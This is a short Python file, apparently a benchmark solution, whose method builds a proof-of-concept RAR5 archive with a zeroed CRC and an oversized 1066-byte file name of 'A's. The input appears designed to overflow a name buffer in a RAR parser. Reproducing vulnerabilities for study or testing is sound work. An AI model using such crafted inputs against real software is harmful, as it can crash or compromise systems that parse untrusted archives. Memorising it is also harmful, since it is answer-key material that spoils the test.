class Solution:
    def _to_vint(self, n):
        if n == 0:
            return b'\x00'
        res = bytearray()
        while n > 0:
            byte = n & 0x7f
            n >>= 7
            if n > 0:
                byte |= 0x80
            res.append(byte)
        return bytes(res)

    def solve(self, src_path: str) -> bytes:
        poc = bytearray(b'Rar!\x1a\x07\x01\x00')

        file_header_body = bytearray()

        file_header_body += self._to_vint(2)
        file_header_body += self._to_vint(0)
        file_header_body += self._to_vint(0)
        file_header_body += self._to_vint(0)
        file_header_body += self._to_vint(0)
        file_header_body += self._to_vint(0x30)
        file_header_body += self._to_vint(2)

        name_length = 1066
        file_header_body += self._to_vint(name_length)
        file_header_body += b'A' * name_length

        file_header_block = bytearray()
        file_header_block += b'\x00\x00\x00\x00'
        
        header_size = len(file_header_body)
        file_header_block += self._to_vint(header_size)
        file_header_block += file_header_body

        poc += file_header_block
        
        return bytes(poc)